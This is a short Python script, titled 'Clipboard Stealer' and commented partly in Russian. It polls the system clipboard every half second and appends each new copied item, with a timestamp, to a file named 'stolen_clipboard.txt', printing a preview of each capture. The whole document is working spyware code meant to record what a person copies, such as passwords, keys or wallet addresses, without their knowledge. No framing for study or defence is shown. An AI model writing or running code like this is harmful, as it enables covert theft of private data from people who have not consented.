import pyperclip
import time

print("[+] Clipboard Stealer")

last_clip = ""
log_file = "stolen_clipboard.txt"

while True:
    try:
        current = pyperclip.paste()  #проверка буфера обмена

        if current != last_clip and current.strip() != "":
            last_clip = current
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%H:%M:%S')}] {current}\n")
                f.write("-" * 50 + "\n")

            print(f"[+] Скопировано: {current[:100]}...")  #вывод результата

    except:
        pass

    time.sleep(0.5)